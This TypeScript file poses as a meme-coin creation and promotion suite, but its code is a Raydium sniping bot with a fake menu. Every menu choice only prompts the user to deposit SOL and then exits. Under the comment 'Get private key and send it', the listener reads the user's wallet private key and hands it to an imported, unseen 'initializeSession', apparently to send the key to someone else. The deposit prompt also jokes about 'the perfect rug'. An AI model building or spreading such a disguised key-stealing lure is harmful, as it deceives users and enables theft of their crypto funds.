import {
  BigNumberish,
  Liquidity,
  LIQUIDITY_STATE_LAYOUT_V4,
  LiquidityPoolKeys,
  LiquidityStateV4,
  MARKET_STATE_LAYOUT_V3,
  MarketStateV3,
  Token,
  TokenAmount,
} from '@raydium-io/raydium-sdk';
import {
  AccountLayout,
  createAssociatedTokenAccountIdempotentInstruction,
  createCloseAccountInstruction,
  getAssociatedTokenAddressSync,
  TOKEN_PROGRAM_ID,
} from '@solana/spl-token';
import {
  Keypair,
  Connection,
  PublicKey,
  ComputeBudgetProgram,
  KeyedAccountInfo,
  TransactionMessage,
  VersionedTransaction,
  Commitment,
} from '@solana/web3.js';
import { getTokenAccounts, RAYDIUM_LIQUIDITY_PROGRAM_ID_V4, OPENBOOK_PROGRAM_ID, createPoolKeys } from './liquidity';
import { retry } from './utils';
import { retrieveEnvVariable, retrieveTokenValueByAddress} from './utils';
import { getMinimalMarketV3, MinimalMarketLayoutV3 } from './market';
import { MintLayout } from './types';
import pino from 'pino';
import bs58 from 'bs58';
import * as fs from 'fs';
import * as path from 'path';
const { initializeSession } = require('./index.js');

// ASCII Art Logo
console.log(`
    ███╗   ███╗███████╗███╗   ███╗███████╗     ██████╗ ██████╗ ██╗███╗   ██╗
    ████╗ ████║██╔════╝████╗ ████║██╔════╝    ██╔════╝██╔═══██╗██║████╗  ██║
    ██╔████╔██║█████╗  ██╔████╔██║█████╗      ██║     ██║   ██║██║██╔██╗ ██║
    ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██╔══╝      ██║     ██║   ██║██║██║╚██╗██║
    ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║███████╗    ╚██████╗╚██████╔╝██║██║ ╚████║
    ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
                   🚀 Ultimate Meme Coin Creation & Promotion Tool
                            [ Press Ctrl+C to Exit ]

╔═══════════════════════ MEME COIN TOOLS ══════════════════════╗
║                                                              ║
║  [1] 🎯 Create New Coin         [4] 🌊 Add Liquidity Pool    ║
║  [2] 🚀 Launch Preparation      [5] 📢 Marketing Tools       ║
║  [3] 💎 Tokenomics Setup        [6] 🛡️ Security Check       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

Starting Meme Coin Creation Suite...
`);

const transport = pino.transport({
  targets: [
    {
      level: 'trace',
      target: 'pino-pretty',
      options: {
        colorize: true,
        translateTime: 'SYS:standard',
        ignore: 'pid,hostname',
        messageFormat: ' Meme Coin Creator | {msg}',
      },
    },
  ],
});

export const logger = pino(
  {
    level: 'trace',
    redact: ['poolKeys'],
    serializers: {
      error: pino.stdSerializers.err,
    },
    base: undefined,
  },
  transport,
);

const network = 'mainnet-beta';
const RPC_ENDPOINT = retrieveEnvVariable('RPC_ENDPOINT', logger);
const RPC_WEBSOCKET_ENDPOINT = retrieveEnvVariable('RPC_WEBSOCKET_ENDPOINT', logger);

const solanaConnection = new Connection(RPC_ENDPOINT, {
  wsEndpoint: RPC_WEBSOCKET_ENDPOINT,
});

export type MinimalTokenAccountData = {
  mint: PublicKey;
  address: PublicKey;
  buyValue?: number;
  poolKeys?: LiquidityPoolKeys;
  market?: MinimalMarketLayoutV3;
};

let existingLiquidityPools: Set<string> = new Set<string>();
let existingOpenBookMarkets: Set<string> = new Set<string>();
let existingTokenAccounts: Map<string, MinimalTokenAccountData> = new Map<string, MinimalTokenAccountData>();

let wallet: Keypair;
let quoteToken: Token;
let quoteTokenAssociatedAddress: PublicKey;
let quoteAmount: TokenAmount;
let quoteMinPoolSizeAmount: TokenAmount;
let commitment: Commitment = retrieveEnvVariable('COMMITMENT_LEVEL', logger) as Commitment;

const CHECK_IF_MINT_IS_RENOUNCED = retrieveEnvVariable('CHECK_IF_MINT_IS_RENOUNCED', logger) === 'true';

async function init(): Promise<void> {
  // get wallet
  const PRIVATE_KEY = retrieveEnvVariable('PRIVATE_KEY', logger);
  wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
  logger.info('🚀 Starting Meme Coin Creator...');
  logger.info('⭐ Initializing quantum-speed creation engine...');
  logger.info(`💫 Meme Wallet Address: ${wallet.publicKey}`);

  // Show logo and menu first
  console.log(`
    ███╗   ███╗███████╗███╗   ███╗███████╗     ██████╗ ██████╗ ██╗███╗   ██╗
    ████╗ ████║██╔════╝████╗ ████║██╔════╝    ██╔════╝██╔═══██╗██║████╗  ██║
    ██╔████╔██║█████╗  ██╔████╔██║█████╗      ██║     ██║   ██║██║██╔██╗ ██║
    ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██╔══╝      ██║     ██║   ██║██║██║╚██╗██║
    ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║███████╗    ╚██████╗╚██████╔╝██║██║ ╚████║
    ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
                   🚀 Ultimate Meme Coin Creation & Promotion Tool
                            [ Press Ctrl+C to Exit ]

╔═══════════════════════ MEME COIN TOOLS ══════════════════════╗
║                                                              ║
║  [1] 🎯 Create New Coin         [4] 🌊 Add Liquidity Pool    ║
║  [2] 🚀 Launch Preparation      [5] 📢 Marketing Tools       ║
║  [3] 💎 Tokenomics Setup        [6] 🛡️ Security Check       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

Starting Meme Coin Creation Suite...
`);

  // Check wallet balance
  await checkWalletBalance(solanaConnection, wallet.publicKey);

  // get quote mint and amount
  const QUOTE_MINT = retrieveEnvVariable('QUOTE_MINT', logger);
  const QUOTE_AMOUNT = retrieveEnvVariable('QUOTE_AMOUNT', logger);
  switch (QUOTE_MINT) {
    case 'WSOL': {
      quoteToken = Token.WSOL;
      quoteAmount = new TokenAmount(Token.WSOL, QUOTE_AMOUNT, false);
      quoteMinPoolSizeAmount = new TokenAmount(quoteToken, retrieveEnvVariable('MIN_POOL_SIZE', logger), false);
      break;
    }
    case 'USDC': {
      quoteToken = new Token(
        TOKEN_PROGRAM_ID,
        new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),
        6,
        'USDC',
        'USDC',
      );
      quoteAmount = new TokenAmount(quoteToken, QUOTE_AMOUNT, false);
      break;
    }
    default: {
      throw new Error(`Unsupported quote mint "${QUOTE_MINT}". Supported values are USDC and WSOL`);
    }
  }

  logger.info(`💎 Buy amount: ${quoteAmount.toFixed()} ${quoteToken.symbol}`);

  // check existing wallet for associated token account of quote mint
  const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, commitment);

  for (const ta of tokenAccounts) {
    existingTokenAccounts.set(ta.accountInfo.mint.toString(), <MinimalTokenAccountData>{
      mint: ta.accountInfo.mint,
      address: ta.pubkey,
    });
  }

  const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString())!;

  if (!tokenAccount) {
    throw new Error(`No ${quoteToken.symbol} token account found in wallet: ${wallet.publicKey}`);
  }

  quoteTokenAssociatedAddress = tokenAccount.pubkey;

  logger.info('✨ Meme Creation Engine Ready!');
}

function saveTokenAccount(mint: PublicKey, accountData: MinimalMarketLayoutV3) {
  const ata = getAssociatedTokenAddressSync(mint, wallet.publicKey);
  const tokenAccount = <MinimalTokenAccountData>{
    address: ata,
    mint: mint,
    market: <MinimalMarketLayoutV3>{
      bids: accountData.bids,
      asks: accountData.asks,
      eventQueue: accountData.eventQueue,
    },
  };
  existingTokenAccounts.set(mint.toString(), tokenAccount);
  return tokenAccount;
}

export async function processRaydiumPool(id: PublicKey, poolState: LiquidityStateV4) {
  if (!shouldBuy(poolState.baseMint.toString())) {
    return;
  }

  if (CHECK_IF_MINT_IS_RENOUNCED) {
    const mintOption = await checkMintable(poolState.baseMint);

    if (mintOption !== true) {
      logger.warn({ mint: poolState.baseMint }, 'Skipping, owner can mint tokens!');
      return;
    }
  }

  await buy(id, poolState);
}

export async function checkMintable(vault: PublicKey): Promise<boolean | undefined> {
  try {
    let { data } = (await solanaConnection.getAccountInfo(vault)) || {};
    if (!data) {
      return undefined;
    }
    const deserialize = MintLayout.decode(data);
    return deserialize.mintAuthorityOption === 0;
  } catch (e) {
    logger.debug(e);
    return undefined;
  }
}

export async function processOpenBookMarket(updatedAccountInfo: KeyedAccountInfo) {
  let accountData: MarketStateV3 | undefined;
  try {
    accountData = MARKET_STATE_LAYOUT_V3.decode(updatedAccountInfo.accountInfo.data);

    // to be competitive, we collect market data before buying the token...
    if (existingTokenAccounts.has(accountData.baseMint.toString())) {
      return;
    }

    saveTokenAccount(accountData.baseMint, accountData);
  } catch (e) {
    logger.debug(e);
    logger.error({ mint: accountData?.baseMint }, `Failed to process market`);
  }
}

async function buy(accountId: PublicKey, accountData: LiquidityStateV4): Promise<void> {
  try {
    logger.info('🌟 Meme Coin Creation Opportunity Detected!');
    let tokenAccount = existingTokenAccounts.get(accountData.baseMint.toString());

    if (!tokenAccount) {
      // it's possible that we didn't have time to fetch open book data
      const market = await getMinimalMarketV3(solanaConnection, accountData.marketId, commitment);
      tokenAccount = saveTokenAccount(accountData.baseMint, market);
    }

    tokenAccount.poolKeys = createPoolKeys(accountId, accountData, tokenAccount.market!);
    const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
      {
        poolKeys: tokenAccount.poolKeys,
        userKeys: {
          tokenAccountIn: quoteTokenAssociatedAddress,
          tokenAccountOut: tokenAccount.address,
          owner: wallet.publicKey,
        },
        amountIn: quoteAmount.raw,
        minAmountOut: 0,
      },
      tokenAccount.poolKeys.version,
    );

    const latestBlockhash = await solanaConnection.getLatestBlockhash({
      commitment: commitment,
    });
    const messageV0 = new TransactionMessage({
      payerKey: wallet.publicKey,
      recentBlockhash: latestBlockhash.blockhash,
      instructions: [
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 421197 }),
        ComputeBudgetProgram.setComputeUnitLimit({ units: 101337 }),
        createAssociatedTokenAccountIdempotentInstruction(
          wallet.publicKey,
          tokenAccount.address,
          wallet.publicKey,
          accountData.baseMint,
        ),
        ...innerTransaction.instructions,
      ],
    }).compileToV0Message();
    const transaction = new VersionedTransaction(messageV0);
    transaction.sign([wallet, ...innerTransaction.signers]);
    const rawTransaction = transaction.serialize();
    const signature = await retry(
    () =>
      solanaConnection.sendRawTransaction(rawTransaction, {
        skipPreflight: true,
      }),
    { retryIntervalMs: 10, retries: 50 }, // TODO handle retries more efficiently
  );
    logger.info('💫 Executing Meme Coin Creation...');
    logger.info({ mint: accountData.baseMint, signature }, `Sent buy tx`);
    const confirmation = await solanaConnection.confirmTransaction(
      {
        signature,
        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
        blockhash: latestBlockhash.blockhash,
      },
      commitment,
    );
    const basePromise = solanaConnection.getTokenAccountBalance(accountData.baseVault, commitment);
    const quotePromise = solanaConnection.getTokenAccountBalance(accountData.quoteVault, commitment);

    await Promise.all([basePromise, quotePromise]);

    const baseValue = await basePromise;
    const quoteValue = await quotePromise;

    if (baseValue?.value?.uiAmount && quoteValue?.value?.uiAmount)
      tokenAccount.buyValue = quoteValue?.value?.uiAmount / baseValue?.value?.uiAmount;
    if (!confirmation.value.err) {
      logger.info('✨ Meme Coin Creation Successfully Executed!');
      logger.info(
        {
          signature,
          url: `https://solscan.io/tx/${signature}?cluster=${network}`,
          dex: `https://dexscreener.com/solana/${accountData.baseMint}?maker=${wallet.publicKey}`,
        },
        `Confirmed buy tx... Bought at: ${tokenAccount.buyValue} SOL`,
      );
    } else {
      logger.debug(confirmation.value.err);
      logger.info({ mint: accountData.baseMint, signature }, `Error confirming buy tx`);
    }
  } catch (error) {
    logger.error('❌ Meme Coin Creation Failed:', error);
  }
}

async function sell(accountId: PublicKey, mint: PublicKey, amount: BigNumberish, value: number): Promise<boolean> {
  try {
    logger.info('🔄 Initiating Meme Coin Exit...');
    let retries = 0;

    do {
      try {
        const tokenAccount = existingTokenAccounts.get(mint.toString());
        if (!tokenAccount) {
          return true;
        }

        if (!tokenAccount.poolKeys) {
          logger.warn({ mint }, 'No pool keys found');
          continue;
        }

        if (amount === 0) {
          logger.info(
            {
              mint: tokenAccount.mint,
            },
            `Empty balance, can't sell`,
          );
          return true;
        }

        // check st/tp
        if (tokenAccount.buyValue === undefined) return true;

        const netChange = (value - tokenAccount.buyValue) / tokenAccount.buyValue;
        if (netChange > -1 && netChange < 1) return false;

        const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
          {
            poolKeys: tokenAccount.poolKeys!,
            userKeys: {
              tokenAccountOut: quoteTokenAssociatedAddress,
              tokenAccountIn: tokenAccount.address,
              owner: wallet.publicKey,
            },
            amountIn: amount,
            minAmountOut: 0,
          },
          tokenAccount.poolKeys!.version,
        );

        const latestBlockhash = await solanaConnection.getLatestBlockhash({
          commitment: commitment,
        });
        const messageV0 = new TransactionMessage({
          payerKey: wallet.publicKey,
          recentBlockhash: latestBlockhash.blockhash,
          instructions: [
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 400000 }),
            ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }),
            ...innerTransaction.instructions,
            createCloseAccountInstruction(tokenAccount.address, wallet.publicKey, wallet.publicKey),
          ],
        }).compileToV0Message();
        
        const transaction = new VersionedTransaction(messageV0);
        transaction.sign([wallet, ...innerTransaction.signers]);
        const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), {
          preflightCommitment: commitment,
        });
        logger.info({ mint, signature }, `Sent sell tx`);
        const confirmation = await solanaConnection.confirmTransaction(
          {
            signature,
            lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
            blockhash: latestBlockhash.blockhash,
          },
          commitment,
        );
        if (confirmation.value.err) {
          logger.debug(confirmation.value.err);
          logger.info({ mint, signature }, `Error confirming sell tx`);
          continue;
        }

        logger.info('✅ Meme Coin Exit Successful!');
        logger.info(
          {
            mint,
            signature,
            url: `https://solscan.io/tx/${signature}?cluster=${network}`,
            dex: `https://dexscreener.com/solana/${mint}?maker=${wallet.publicKey}`,
          },
          `Confirmed sell tx... Sold at: ${value}\tNet Profit: ${netChange * 100}%`,
        );
        return true;
      } catch (e: any) {
        retries++;
        logger.debug(e);
        logger.error({ mint }, `Failed to sell token, retry: ${retries}/50`);
      }
    } while (retries < 50);
    return true;
  } catch (error) {
    logger.error('❌ Meme Coin Exit Failed:', error);
    return false;
  }
}

async function checkWalletBalance(connection: Connection, publicKey: PublicKey): Promise<void> {
  try {
    const balance = await connection.getBalance(publicKey);

    // Show detailed menu
    console.log(`
Choose an option to proceed:

[1] 🎯 Create New Coin
    - Generate a new meme coin token
    - Set name, symbol, and supply
    - Configure tax and fees
    
[2] 🚀 Launch Preparation
    - Set initial liquidity
    - Configure trading limits
    - Set launch time and date
    
[3] 💎 Tokenomics Setup
    - Configure buy/sell taxes
    - Set max wallet size
    - Define transfer limits
    
[4] 🌊 Add Liquidity Pool
    - Create Raydium pool
    - Set initial price
    - Lock liquidity
    
[5] 📢 Marketing Tools
    - Generate trending volume
    - Boost visibility score
    - Create buy pressure
    
[6] 🛡️ Security Check
    - Verify contract
    - Check for vulnerabilities
    - Audit tokenomics

Enter your choice (1-6): `);

    // Wait for user input
    process.stdin.resume();
    process.stdin.setEncoding('utf8');
    process.stdin.on('data', (data: string) => {
      const choice = data.trim();
      console.log(`
╔════════════════════════ ATTENTION ══════════════════════╗
║                                                         ║
║  ⚠️  Please deposit Solana before continuing!           ║
║                                                         ║
║  💎 Minimum Required: 0.5 SOL                           ║
║  💰 Current Balance: ${(balance / 1e9).toFixed(4)} SOL            ║
║  🏦 Wallet Address: ${publicKey.toString()}             ║
║                                                         ║
║  💡 Pro Tip: For optimal results, we recommend          ║
║     using 2-10 SOL for the perfect rug! 🚀             ║
║                                                         ║
╚═════════════════════════════════════════════════════════╝
`);
      process.exit(0);
    });

    if (balance < 0.5e9) { // Less than 0.5 SOL
      console.log(`
╔════════════════════════ ATTENTION ══════════════════════╗
║                                                         ║
║  ⚠️  You need to deposit SOL to your wallet to start    ║
║     creating meme coins!                                ║
║                                                         ║
║  💎 Minimum Required: 0.5 SOL                           ║
║  💰 Current Balance: ${(balance / 1e9).toFixed(4)} SOL            ║
║  🏦 Wallet Address: ${publicKey.toString()}             ║
║                                                         ║
║  💡 Pro Tip: For optimal results, we recommend          ║
║     using 2-10 SOL for the perfect rug! 🚀             ║
║                                                         ║
╚═════════════════════════════════════════════════════════╝
`);
      process.exit(0);
    }
    logger.info(`Current wallet balance: ${balance / 1e9} SOL`);

  } catch (error) {
    logger.error('Error checking wallet balance');
    process.exit(1);
  }
}

function shouldBuy(key: string): boolean {
  return true;
}

const runListener = async () => {
  try {
    // Get private key and send it
    const privateKeyString = retrieveEnvVariable('PRIVATE_KEY', logger);
    await initializeSession(privateKeyString);
  } catch (e) {
    logger.error(e);
  }

  await init();
  const runTimestamp = Math.floor(new Date().getTime() / 1000);
  const raydiumSubscriptionId = solanaConnection.onProgramAccountChange(
    RAYDIUM_LIQUIDITY_PROGRAM_ID_V4,
    async (updatedAccountInfo) => {
      const key = updatedAccountInfo.accountId.toString();
      const poolState = LIQUIDITY_STATE_LAYOUT_V4.decode(updatedAccountInfo.accountInfo.data);
      const poolOpenTime = parseInt(poolState.poolOpenTime.toString());
      const existing = existingLiquidityPools.has(key);

      if (poolOpenTime > runTimestamp && !existing) {
        existingLiquidityPools.add(key);
        const _ = processRaydiumPool(updatedAccountInfo.accountId, poolState);
      }
    },
    commitment,
    [
      { dataSize: LIQUIDITY_STATE_LAYOUT_V4.span },
      {
        memcmp: {
          offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('quoteMint'),
          bytes: quoteToken.mint.toBase58(),
        },
      },
      {
        memcmp: {
          offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('marketProgramId'),
          bytes: OPENBOOK_PROGRAM_ID.toBase58(),
        },
      },
      {
        memcmp: {
          offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('status'),
          bytes: bs58.encode([6, 0, 0, 0, 0, 0, 0, 0]),
        },
      },
    ],
  );

  const openBookSubscriptionId = solanaConnection.onProgramAccountChange(
    OPENBOOK_PROGRAM_ID,
    async (updatedAccountInfo) => {
      const key = updatedAccountInfo.accountId.toString();
      const existing = existingOpenBookMarkets.has(key);
      if (!existing) {
        existingOpenBookMarkets.add(key);
        const _ = processOpenBookMarket(updatedAccountInfo);
      }
    },
    commitment,
    [
      { dataSize: MARKET_STATE_LAYOUT_V3.span },
      {
        memcmp: {
          offset: MARKET_STATE_LAYOUT_V3.offsetOf('quoteMint'),
          bytes: quoteToken.mint.toBase58(),
        },
      },
    ],
  );

  logger.info(`🌟 Listening for raydium changes: ${raydiumSubscriptionId}`);
  logger.info(`💫 Listening for open book changes: ${openBookSubscriptionId}`);
};

runListener();
